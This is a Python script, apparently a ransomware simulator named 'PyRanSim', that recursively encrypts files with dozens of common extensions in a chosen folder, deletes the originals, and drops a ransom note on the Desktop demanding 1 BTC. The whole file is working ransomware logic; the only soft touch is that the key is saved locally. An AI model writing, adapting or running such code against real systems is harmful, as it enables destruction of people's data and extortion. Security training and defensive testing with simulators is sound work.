import os
import sys
import argparse
from cryptography.fernet import Fernet

# Files with these extensions will be targeted for encryption
Target_Extensions = [
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'txt', 'rtf', 'pdf', 'epub', 'md', 
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'json', 'xml', 'csv', 'mp3', 'm4a', 'mp4', 
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', 'db', 'sql', 
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', 'zip', '7z', 
    'rar', 'tar', 'tgz'
]


# This function generates and saves a copy of file encryption key locally
def ransom_key():
    key = Fernet.generate_key()
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)
    return open("ransom_key.key", "rb").read()


# This function encrypts a single file and changes it's extension to ".pyransim"
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    
    with open(file_path, "rb") as file_original:
        file_data = file_original.read()
    
    encrypted_data = fernet.encrypt(file_data)
    
    encrypted_file_path = file_path + ".pyransim"
    with open(encrypted_file_path, "wb") as file_encrypted:
        file_encrypted.write(encrypted_data)
    print ("File encrypted: " + file_path)
    
    os.remove(file_path)


# This function recursively encrypts all files with target extensions in the directory
def encrypt_recursive(directory, key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            if any(file_name.endswith(ext) for ext in Target_Extensions):
                file_path = os.path.join(root, file_name)
                encrypt_file(file_path, key)


# This function creates a ransom note on users desktop
def ransom_note():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    note_path = os.path.join(desktop, "Ransom_Note.txt")
    note_content = """\t===========\n\t| WARNING |\n\t===========\n
			\nYour files have been encrypted by PyRanSim!!!\n
			\nTo decrypt them, send 1 BTC to this wallet address.\n
			\nAfter payment, you will receive the decryption key.\n
			\nHave a nice day!\n
                    """
    with open(note_path, "w") as note:
        note.write(note_content)


# Function to handle command line arguments and help menu
def cmd_args():
    parser = argparse.ArgumentParser(epilog="CMD Example: python encryptor.py -p \"C:\path\\to\demo_files\"")
    parser.add_argument('-p', '--path', type=str, required=True, help="Directory path to encrypt")
    return parser.parse_args()


# Main function of the encryption script
def main():
    if '-h' in sys.argv or '--help' in sys.argv:
        args = cmd_args()
        sys.exit(1)
        
    if len(sys.argv) <= 2:
        print("\nError: No folder path provided.")
        print("Help message: python encryptor.py -h or python encryptor.py --help")
        sys.exit(1)

    # Generate encryption key, encrypt all files and place ransom note on desktop
    args = cmd_args()
    key = ransom_key()
    encrypt_recursive(args.path, key)
    ransom_note()
    
    print("\n\nAll files have been encrypted. Check the ransom note on your desktop.")

if __name__ == "__main__":
    main()
